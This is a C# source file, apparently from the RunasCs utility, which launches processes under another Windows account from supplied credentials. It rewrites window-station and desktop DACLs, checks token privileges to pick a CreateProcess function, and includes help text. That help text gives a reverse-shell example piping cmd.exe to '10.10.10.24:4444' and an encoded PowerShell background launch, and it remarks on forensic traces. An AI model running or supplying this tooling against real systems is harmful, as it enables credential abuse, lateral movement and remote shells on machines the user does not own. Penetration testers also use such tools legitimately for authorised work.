	private static extern bool GetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSID, uint nLength, out uint lpnLengthNeeded);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetSecurityDescriptorDacl(IntPtr pSecurityDescriptor, [MarshalAs(UnmanagedType.Bool)] out bool bDaclPresent, ref IntPtr pDacl,[MarshalAs(UnmanagedType.Bool)] out bool bDaclDefaulted);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetAclInformation(IntPtr pAcl, ref ACL_SIZE_INFORMATION pAclInformation, uint nAclInformationLength, ACL_INFORMATION_CLASS dwAclInformationClass);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool InitializeSecurityDescriptor(IntPtr SecurityDescriptor, uint dwRevision);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int GetLengthSid(IntPtr pSID);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool InitializeAcl(IntPtr pAcl, uint nAclLength, uint dwAclRevision);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetAce(IntPtr aclPtr, int aceIndex, out IntPtr acePtr);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AddAce(IntPtr pAcl, uint dwAceRevision, uint dwStartingAceIndex, IntPtr pAceList, uint nAceListLength);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AddAccessAllowedAce(IntPtr pAcl, uint dwAceRevision, ACCESS_MASK AccessMask, IntPtr pSid);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool SetSecurityDescriptorDacl(IntPtr sd, bool daclPresent, IntPtr dacl, bool daclDefaulted);
    
    [DllImport("user32.dll", SetLastError = true)]
	private static extern bool SetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSD);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool CopySid(uint nDestinationSidLength, IntPtr pDestinationSid, IntPtr pSourceSid);
    
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
    private static extern bool LookupAccountName(string lpSystemName, string lpAccountName, [MarshalAs(UnmanagedType.LPArray)] byte[] Sid, ref uint cbSid, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);
    
    
    private IntPtr hWinsta;
    private IntPtr hDesktop;
    private IntPtr userSid;

    public WindowStationDACL()
    {
        this.hWinsta = IntPtr.Zero;
        this.hDesktop = IntPtr.Zero;
        this.userSid = IntPtr.Zero;
    }
    
    private IntPtr GetUserSid(string domain, string username){
        IntPtr userSid = IntPtr.Zero;
        string fqan = "";//Fully qualified account names
        byte [] Sid = null;
        uint cbSid = 0;
        StringBuilder referencedDomainName = new StringBuilder();
        uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
        SID_NAME_USE sidUse;
        int err = NO_ERROR;
        
        if(domain != "" && domain != ".")
            fqan = domain + "\\" + username;
        else
            fqan = username;
        
        if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
        {
            err = Marshal.GetLastWin32Error();
            if (err == ERROR_INSUFFICIENT_BUFFER || err == ERROR_INVALID_FLAGS)
            {
                Sid = new byte[cbSid];
                referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
                err = NO_ERROR;
                if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
                    err = Marshal.GetLastWin32Error();
            }
        }
        else{
            string error = "The username " + fqan + " has not been found.\r\n";
            error += "[-] LookupAccountName failed with error code " + Marshal.GetLastWin32Error();
            throw new RunasCsException(error);
        }
        if (err == 0)
        {
            userSid = Marshal.AllocHGlobal((int)cbSid);
            Marshal.Copy(Sid, 0, userSid, (int)cbSid);
        }
        else{
            string error = "The username " + fqan + " has not been found.\r\n";
            error += "[-] LookupAccountName failed with error code " + Marshal.GetLastWin32Error();
            throw new RunasCsException(error);
        }
        return userSid;
    }
    
    //Big thanks to Vanara project
    //https://github.com/dahall/Vanara/blob/9771eadebc874cfe876011c9d6588aefb62626d9/PInvoke/Security/AdvApi32/SecurityBaseApi.cs#L4656
    private void AddAllowedAceToDACL(IntPtr pDacl, ACCESS_MASK mask, byte aceFlags, uint aceSize){
        int offset = Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) - Marshal.SizeOf(typeof(uint));
        ACE_HEADER AceHeader = new ACE_HEADER();
        AceHeader.AceType = ACCESS_ALLOWED_ACE_TYPE;
        AceHeader.AceFlags = aceFlags;
        AceHeader.AceSize = (short)aceSize;
        IntPtr pNewAcePtr = Marshal.AllocHGlobal((int)aceSize);
        ACCESS_ALLOWED_ACE pNewAceStruct = new ACCESS_ALLOWED_ACE();
        pNewAceStruct.Header = AceHeader;
        pNewAceStruct.Mask = mask;
        Marshal.StructureToPtr(pNewAceStruct, pNewAcePtr, false);
        IntPtr sidStartPtr = new IntPtr(pNewAcePtr.ToInt64() + offset);
        if (!CopySid((uint)GetLengthSid(this.userSid), sidStartPtr, this.userSid))
        {
            throw new RunasCsException("CopySid failed with error code " + Marshal.GetLastWin32Error());
        }
        if (!AddAce(pDacl, ACL_REVISION, MAXDWORD, pNewAcePtr, aceSize))
        {
            throw new RunasCsException("AddAce failed with error code " + Marshal.GetLastWin32Error());
        }
        Marshal.FreeHGlobal(pNewAcePtr);
    }

    private void AddAceToWindowStation(){
        uint cbSd = 0;
        bool fDaclPresent = false;
        bool fDaclExist = false;
        IntPtr pDacl = IntPtr.Zero;
        uint cbDacl = 0;
        IntPtr pSd = IntPtr.Zero;
        IntPtr pNewSd = IntPtr.Zero;
        uint cbNewDacl = 0;
        uint cbNewAce = 0;
        IntPtr pNewDacl = IntPtr.Zero;
        
        ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
        SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
        // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, 0, out cbSd))
        {
            if (Marshal.GetLastWin32Error() != ERROR_INSUFFICIENT_BUFFER)
            {
                throw new RunasCsException("GetUserObjectSecurity 1 size failed with error code " + Marshal.GetLastWin32Error());
            }
        }
        pSd = Marshal.AllocHGlobal((int)cbSd);
        // Obtain the security descriptor for the desktop object.
        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, cbSd, out cbSd))
        {
            throw new RunasCsException("GetUserObjectSecurity 2 failed with error code " + Marshal.GetLastWin32Error());
        }
        // Get the DACL from the security descriptor.
        if (!GetSecurityDescriptorDacl(pSd, out fDaclPresent, ref pDacl, out fDaclExist))
        {
            throw new RunasCsException("GetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
        }
        // Get the size information of the DACL.
        if (pDacl == IntPtr.Zero)
        {
            cbDacl = 0;
        }
        else
        {
            if (!GetAclInformation(pDacl, ref aclSizeInfo, (uint)Marshal.SizeOf(typeof(ACL_SIZE_INFORMATION)), ACL_INFORMATION_CLASS.AclSizeInformation))
            {
                throw new RunasCsException("GetAclInformation failed with error code " + Marshal.GetLastWin32Error());
            }
            cbDacl = aclSizeInfo.AclBytesInUse;
        }
        
        // Allocate memory for the new security descriptor.
        pNewSd = Marshal.AllocHGlobal((int)cbSd);
        // Initialize the new security descriptor.
        if (!InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION))
        {
            throw new RunasCsException("InitializeSecurityDescriptor failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // Compute the size of a DACL to be added to the new security descriptor.
        cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
        if(cbDacl == 0)
            cbNewDacl =  8 + (cbNewAce*2);//8 = sizeof(ACL)
        else
            cbNewDacl = cbDacl + (cbNewAce*2);

        // Allocate memory for the new DACL.
        pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl);
        // Initialize the new DACL.
        if (!InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION))
        {
            throw new RunasCsException("InitializeAcl failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // If the original DACL is present, copy it to the new DACL.
        if (fDaclPresent)
        {
            // Copy the ACEs to the new DACL.
            for (int dwIndex = 0; dwIndex < aclSizeInfo.AceCount; dwIndex++)
            {
                IntPtr pTempAce = IntPtr.Zero;
                // Get an ACE.
                if (!GetAce(pDacl, dwIndex, out pTempAce))
                {
                    throw new RunasCsException("GetAce failed with error code " + Marshal.GetLastWin32Error());
                }
                ACE_HEADER pTempAceStruct = (ACE_HEADER)Marshal.PtrToStructure(pTempAce, typeof(ACE_HEADER));
                // Add the ACE to the new ACL.
                if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, (uint)pTempAceStruct.AceSize))
                {
                    throw new RunasCsException("AddAce failed with error code " + Marshal.GetLastWin32Error());
                }
            }
        }
        
        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.GENERIC_ACCESS, CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE, cbNewAce);
        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.WINSTA_ALL, NO_PROPAGATE_INHERIT_ACE, cbNewAce);
        // Assign the new DACL to the new security descriptor.
        if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))
        {
            throw new RunasCsException("SetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
        }
        //  Set the new security descriptor for the desktop object.
        if (!SetUserObjectSecurity(this.hWinsta, ref si, pNewSd))
        {
            throw new RunasCsException("SetUserObjectSecurity failed with error code " + Marshal.GetLastWin32Error());
        }
        
        Marshal.FreeHGlobal(pSd);
        Marshal.FreeHGlobal(pNewSd);
        Marshal.FreeHGlobal(pNewDacl);
    }
    
    private void AddAceToDesktop(){
        uint cbSd = 0;
        bool fDaclPresent = false;
        bool fDaclExist = false;
        IntPtr pDacl = IntPtr.Zero;
        uint cbDacl = 0;
        IntPtr pSd = IntPtr.Zero;
        IntPtr pNewSd = IntPtr.Zero;
        uint cbNewDacl = 0;
        uint cbNewAce = 0;
        IntPtr pNewDacl = IntPtr.Zero;
        
        ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
        SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
        // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, 0, out cbSd))
        {
            if (Marshal.GetLastWin32Error() != ERROR_INSUFFICIENT_BUFFER)
            {
                throw new RunasCsException("GetUserObjectSecurity 1 size failed with error code " + Marshal.GetLastWin32Error());
            }
        }
        pSd = Marshal.AllocHGlobal((int)cbSd);
        // Obtain the security descriptor for the desktop object.
        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, cbSd, out cbSd))
        {
            throw new RunasCsException("GetUserObjectSecurity 2 failed with error code " + Marshal.GetLastWin32Error());
        }
        // Get the DACL from the security descriptor.
        if (!GetSecurityDescriptorDacl(pSd, out fDaclPresent, ref pDacl, out fDaclExist))
        {
            throw new RunasCsException("GetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
        }
        // Get the size information of the DACL.
        if (pDacl == IntPtr.Zero)
        {
            cbDacl = 0;
        }
        else
        {
            if (!GetAclInformation(pDacl, ref aclSizeInfo, (uint)Marshal.SizeOf(typeof(ACL_SIZE_INFORMATION)), ACL_INFORMATION_CLASS.AclSizeInformation))
            {
                throw new RunasCsException("GetAclInformation failed with error code " + Marshal.GetLastWin32Error());
            }
            cbDacl = aclSizeInfo.AclBytesInUse;
        }
        
        // Allocate memory for the new security descriptor.
        pNewSd = Marshal.AllocHGlobal((int)cbSd);
        // Initialize the new security descriptor.
        if (!InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION))
        {
            throw new RunasCsException("InitializeSecurityDescriptor failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // Compute the size of a DACL to be added to the new security descriptor.
        cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
        if(cbDacl == 0)
            cbNewDacl =  8 + cbNewAce;//8 = sizeof(ACL)
        else
            cbNewDacl = cbDacl + cbNewAce;

        // Allocate memory for the new DACL.
        pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl);
        // Initialize the new DACL.
        if (!InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION))
        {
            throw new RunasCsException("InitializeAcl failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // If the original DACL is present, copy it to the new DACL.
        if (fDaclPresent)
        {
            // Copy the ACEs to the new DACL.
            for (int dwIndex = 0; dwIndex < aclSizeInfo.AceCount; dwIndex++)
            {
                IntPtr pTempAce = IntPtr.Zero;
                // Get an ACE.
                if (!GetAce(pDacl, dwIndex, out pTempAce))
                {
                    throw new RunasCsException("GetAce failed with error code " + Marshal.GetLastWin32Error());
                }
                ACE_HEADER pTempAceStruct = (ACE_HEADER)Marshal.PtrToStructure(pTempAce, typeof(ACE_HEADER));
                // Add the ACE to the new ACL.
                if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, (uint)pTempAceStruct.AceSize))
                {
                    throw new RunasCsException("AddAce failed with error code " + Marshal.GetLastWin32Error());
                }
            }
        }
        
        // Add a new ACE to the new DACL.
        if (!AddAccessAllowedAce(pNewDacl, ACL_REVISION, ACCESS_MASK.DESKTOP_ALL, this.userSid))
        {
            throw new RunasCsException("AddAccessAllowedAce failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // Assign the new DACL to the new security descriptor.
        if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))
        {
            throw new RunasCsException("SetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
        }
        //  Set the new security descriptor for the desktop object.
        if (!SetUserObjectSecurity(this.hDesktop, ref si, pNewSd))
        {
            throw new RunasCsException("SetUserObjectSecurity failed with error code " + Marshal.GetLastWin32Error());
        }
        
        Marshal.FreeHGlobal(pSd);
        Marshal.FreeHGlobal(pNewSd);
        Marshal.FreeHGlobal(pNewDacl);
    }
    

    public string AddAclToActiveWindowStation(string domain, string username){
        string lpDesktop = "";
        byte[] stationNameBytes = new byte[256];
        string stationName = "";
        uint lengthNeeded = 0;
        IntPtr hWinstaSave = GetProcessWindowStation();
        if(hWinstaSave == IntPtr.Zero)
        {
            throw new RunasCsException("GetProcessWindowStation failed with error code " + Marshal.GetLastWin32Error());
        }
        if(!GetUserObjectInformation(hWinstaSave, UOI_NAME, stationNameBytes, 256, out lengthNeeded)){
            throw new RunasCsException("GetUserObjectInformation failed with error code " + Marshal.GetLastWin32Error());
        }
        stationName = Encoding.Default.GetString(stationNameBytes).Substring(0, (int)lengthNeeded-1);

        this.hWinsta = OpenWindowStation(stationName, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC);
        if(this.hWinsta == IntPtr.Zero)
        {
            throw new RunasCsException("OpenWindowStation failed with error code " + Marshal.GetLastWin32Error());
        }
        
        if(!SetProcessWindowStation(this.hWinsta))
        {
            throw new RunasCsException("SetProcessWindowStation hWinsta failed with error code " + Marshal.GetLastWin32Error());
        }

        this.hDesktop = OpenDesktop("Default", 0, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC | ACCESS_MASK.DESKTOP_WRITEOBJECTS | ACCESS_MASK.DESKTOP_READOBJECTS);
        if(!SetProcessWindowStation(hWinstaSave))
        {
            throw new RunasCsException("SetProcessWindowStation hWinstaSave failed with error code " + Marshal.GetLastWin32Error());
        }

        if(this.hWinsta == IntPtr.Zero)
        {
            throw new RunasCsException("OpenDesktop failed with error code " + Marshal.GetLastWin32Error());
        }

        this.userSid = GetUserSid(domain, username);

        AddAceToWindowStation();
        AddAceToDesktop();

        lpDesktop = stationName + "\\Default";
        return lpDesktop;
    }
    
    public void CleanupHandles()
    {
        if(this.hWinsta != IntPtr.Zero) CloseWindowStation(this.hWinsta);
        if(this.hDesktop != IntPtr.Zero) CloseDesktop(this.hDesktop);
        if(this.userSid != IntPtr.Zero) FreeSid(this.userSid);
    }
}


public static class Token{
        
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool GetTokenInformation(IntPtr TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass,IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);
    
    [DllImport("advapi32.dll", SetLastError = true, CharSet=CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref int cchName );
        
    enum TOKEN_INFORMATION_CLASS{
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin
    }
    
    private struct TOKEN_PRIVILEGES {
       public int PrivilegeCount;
       [MarshalAs(UnmanagedType.ByValArray, SizeConst=64)]
       public LUID_AND_ATTRIBUTES [] Privileges;
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    private struct LUID_AND_ATTRIBUTES {
       public LUID Luid;
       public UInt32 Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct LUID {
       public UInt32 LowPart;
       public Int32 HighPart;
    }
    
    private static string convertAttributeToString(UInt32 attribute){
        if(attribute == 0)
            return "Disabled";
        if(attribute == 1)
            return "Enabled Default";
        if(attribute == 2)
            return "Enabled";
        if(attribute == 3)
            return "Enabled|Enabled Default";
        return "Error";
    }
    
    public static List<string[]> getTokenPrivileges(IntPtr tHandle){
        List<string[]> privileges = new List<string[]>();
        uint TokenInfLength=0;
        bool Result; 
        //Get TokenInformation length in TokenInfLength
        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, TokenInfLength, out TokenInfLength);
        IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenInfLength) ;
        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInformation, TokenInfLength, out TokenInfLength) ; 
        if (Result == false){
            throw new RunasCsException("GetTokenInformation failed with error code " + Marshal.GetLastWin32Error());
        }
        TOKEN_PRIVILEGES TokenPrivileges = ( TOKEN_PRIVILEGES )Marshal.PtrToStructure( TokenInformation , typeof( TOKEN_PRIVILEGES ) ) ;
        for(int i=0;i<TokenPrivileges.PrivilegeCount;i++){
            StringBuilder sb = new StringBuilder();
            int luidNameLen = 0;
            LUID luid = new LUID();
            string[] privilegeStatus = new string[2];
            luid = TokenPrivileges.Privileges[i].Luid;
            IntPtr ptrLuid = Marshal.AllocHGlobal(Marshal.SizeOf(luid));
            Marshal.StructureToPtr(luid, ptrLuid, true);
            LookupPrivilegeName(null, ptrLuid, null, ref luidNameLen); // call once to get the name len
            sb.EnsureCapacity(luidNameLen + 1);
            Result = LookupPrivilegeName(null, ptrLuid, sb, ref luidNameLen);// call again to get the name
            if (Result == false){
                throw new RunasCsException("LookupPrivilegeName failed with error code " + Marshal.GetLastWin32Error());
            }
            privilegeStatus[0]=sb.ToString();
            privilegeStatus[1]=convertAttributeToString(TokenPrivileges.Privileges[i].Attributes);
            privileges.Add(privilegeStatus);
        }
        return privileges;
    }
}


public static class RunasCsMainClass
{
    private static string help = @"
RunasCs v1.3 - @splinter_code

Usage:
    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile]

Description:
    RunasCs is an utility to run specific processes under a different user account
    by specifying explicit credentials. In contrast to the default runas.exe command
    it supports different logon types and crateProcess functions to be used, depending
    on your current permissions. Furthermore it allows input/output redirection (even
    to remote hosts) and you can specify the password directly on the command line.

Positional arguments:
    username                username of the user
    password                password of the user
    cmd                     command supported by cmd.exe if process_timeout>0
                            commandline for the process if process_timeout=0
Optional arguments:
    -d, --domain domain
                            domain of the user, if in a domain. 
                            Default: """"
    -f, --function create_process_function
                            CreateProcess function to use. When not specified
                            RunasCs determines an appropriate CreateProcess
                            function automatically according to your privileges.
                            0 - CreateProcessAsUserA
                            1 - CreateProcessWithTokenW
                            2 - CreateProcessWithLogonW
    -l, --logon-type logon_type
                            the logon type for the spawned process.
                            Default: ""3""
    -r, --remote host:port
                            redirect stdin, stdout and stderr to a remote host.
                            Using this option sets the process timeout to 0.
    -t, --timeout process_timeout
                            the waiting time (in ms) for the created process.
                            This will halt RunasCs until the spawned process
                            ends and sent the output back to the caller.
                            If you set 0 no output will be retrieved and cmd.exe
                            won't be used to spawn the process.
                            Default: ""120000""
    -p, --create-profile
                            if this flag is specified RunasCs will force the
                            creation of the user profile on the machine.
                            This will ensure the process will have the
                            environment variables correctly set.
                            NOTE: this will leave some forensics traces
                            behind creating the user profile directory.
                            Compatible only with -f flags:
                                1 - CreateProcessWithTokenW
                                2 - CreateProcessWithLogonW

Examples:
    Run a command as a specific local user
        RunasCs.exe user1 password1 whoami
    Run a command as a specific domain user and interactive logon type (2)
        RunasCs.exe user1 password1 whoami -d domain -l 2
    Run a background/async process as a specific local user,
        RunasCs.exe user1 password1 ""%COMSPEC% powershell -enc..."" -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
    Run a command simulating the /netonly flag of runas.exe 
        RunasCs.exe user1 password1 whoami -d domain -l 9
";
    
    // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
    private static Dictionary<int,string> getLogonTypeDict()
    {
        Dictionary<int,string> logonTypes = new Dictionary<int,string>();
        logonTypes.Add(2, "Interactive");
        logonTypes.Add(3, "Network");
        logonTypes.Add(4, "Batch");
        logonTypes.Add(5, "Service");
        logonTypes.Add(7, "Unlock");
        logonTypes.Add(8, "NetworkCleartext");
        logonTypes.Add(9, "NewCredentials");
        logonTypes.Add(10,"RemoteInteractive");
        logonTypes.Add(11,"CachedInteractive");
        return logonTypes;
    }

    // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
    private static Dictionary<int,string> getCreateProcessFunctionDict()
    {
        Dictionary<int,string> createProcessFunctions = new Dictionary<int,string>();
        createProcessFunctions.Add(0, "CreateProcessAsUser");
        createProcessFunctions.Add(1, "CreateProcessWithTokenW");
        createProcessFunctions.Add(2, "CreateProcessWithLogonW");
        return createProcessFunctions;
    }

    private static bool HelpRequired(string param)
    {
        return param == "-h" || param == "--help" || param == "/?";
    }
    
    private static uint ValidateProcessTimeout(string timeout)
    {
        uint processTimeout = 120000;
        try {
            processTimeout = Convert.ToUInt32(timeout);
        }
        catch {
            throw new RunasCsException("Invalid process_timeout value: " + timeout);
        }
        return processTimeout;
    }

    private static string[] ValidateRemote(string remote)
    {
        string[] split = remote.Split(':');
        if( split.Length != 2 ) {
            string error = "Invalid remote value: " + remote + "\r\n";
            error += "[-] Expected format: 'host:port'";
            throw new RunasCsException(error);
        }
        return split;
    }
    
    private static int ValidateLogonType(string type)
    {
        int logonType = 3;
        Dictionary<int,string> logonTypes = getLogonTypeDict();

        try {
            logonType = Convert.ToInt32(type);
            if( !logonTypes.ContainsKey(logonType) ) {
                throw new System.ArgumentException("");
            }
        }
        catch {
            string error = "Invalid logon_type value: " + type + "\r\n";
            error += "[-] Allowed values are:\r\n";
            foreach(KeyValuePair<int,string> item in logonTypes) {
                error += String.Format("[-]     {0}\t{1}\r\n", item.Key, item.Value);
            }
            throw new RunasCsException(error);
        }
        return logonType;
    }
    
    private static int ValidateCreateProcessFunction(string function)
    {
        int createProcessFunction = 2;
        Dictionary<int,string> createProcessFunctions = getCreateProcessFunctionDict();
        try {
            createProcessFunction = Convert.ToInt32(function);
            if( createProcessFunction < 0 || createProcessFunction > 2 ) {
                throw new System.ArgumentException("");
            }
        }
        catch {
            string error = "Invalid createProcess function: " + function + "\r\n";
            error += "[-] Allowed values are:\r\n";
            foreach(KeyValuePair<int,string> item in createProcessFunctions) {
                error += String.Format("[-]     {0}\t{1}\r\n", item.Key, item.Value);
            }
            throw new RunasCsException(error);
        }
        return createProcessFunction;
    }

    private static int DefaultCreateProcessFunction()
    {
        int createProcessFunction = 2;
        IntPtr currentTokenHandle = System.Security.Principal.WindowsIdentity.GetCurrent().Token;        

        List<string[]> privs = new List<string[]>();
        privs = Token.getTokenPrivileges(currentTokenHandle);

        bool SeIncreaseQuotaPrivilegeAssigned = false;
        bool SeAssignPrimaryTokenPrivilegeAssigned = false;
        bool SeImpersonatePrivilegeAssigned = false;

        foreach (string[] s in privs)
        {
            string privilege = s[0];
            if(privilege == "SeIncreaseQuotaPrivilege")
                SeIncreaseQuotaPrivilegeAssigned = true;
            if(privilege == "SeAssignPrimaryTokenPrivilege")
                SeAssignPrimaryTokenPrivilegeAssigned = true;
            if(privilege == "SeImpersonatePrivilege")
                SeImpersonatePrivilegeAssigned = true;
        }
        if (SeIncreaseQuotaPrivilegeAssigned && SeAssignPrimaryTokenPrivilegeAssigned)
            createProcessFunction = 0;
        else 
            if (SeImpersonatePrivilegeAssigned)
                createProcessFunction = 1;

        return createProcessFunction;
    }

    public static string RunasCsMain(string[] args)
    {
        string output = "";
        if (args.Length == 1 && HelpRequired(args[0]))
        {
            Console.Out.Write(help);
            return "";
        }

        List<string> positionals = new List<string>();
        string username, password, cmd, domain;
        username = password = cmd = domain = string.Empty;
        string[] remote = null;
        uint processTimeout = 120000;
        int logonType = 3, createProcessFunction = DefaultCreateProcessFunction();
        bool createUserProfile = false;
        
        try {
            for(int ctr = 0; ctr < args.Length; ctr++) {
                switch (args[ctr])
                {

                    case "-d":
                    case "--domain":
                        domain = args[++ctr];
                        break;

                    case "-t":
                    case "--timeout":
                        processTimeout = ValidateProcessTimeout(args[++ctr]);
                        break;

                    case "-l":
                    case "--logon-type":
                        logonType = ValidateLogonType(args[++ctr]);
                        break;

                    case "-f":
                    case "--function":
                        createProcessFunction = ValidateCreateProcessFunction(args[++ctr]);
                        break;

                    case "-r":
                    case "--remote":
                        remote = ValidateRemote(args[++ctr]);
                        break;
                    
                    case "-p":
                    case "--create-profile":
                        createUserProfile = true;
                        break;
                    
                    default:
                        positionals.Add(args[ctr]);
                        break;
                }
            }
        } catch(System.IndexOutOfRangeException) {
            return "[-] Invalid arguments. Use --help for additional help.";
        } catch(RunasCsException e) {
            return String.Format("{0}", e.Message);
        }

        if( positionals.Count < 3 ) {
            return "[-] Not enough arguments. 3 Arguments required. Use --help for additional help.";
        }

        username = positionals[0];
        password = positionals[1];
        cmd = positionals[2];

        if( remote != null ) {
            processTimeout = 0;
        }

        RunasCs invoker = new RunasCs();
        try {
            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, createUserProfile);
        } catch(RunasCsException e) {
            invoker.CleanupHandles();
            output = String.Format("{0}", e.Message);
        }

        return output;
    }
}

public class Runas{

    public static void Main(string[] args)
    {
        Console.Out.Write(RunasCsMainClass.RunasCsMain(args));
    }
}

}
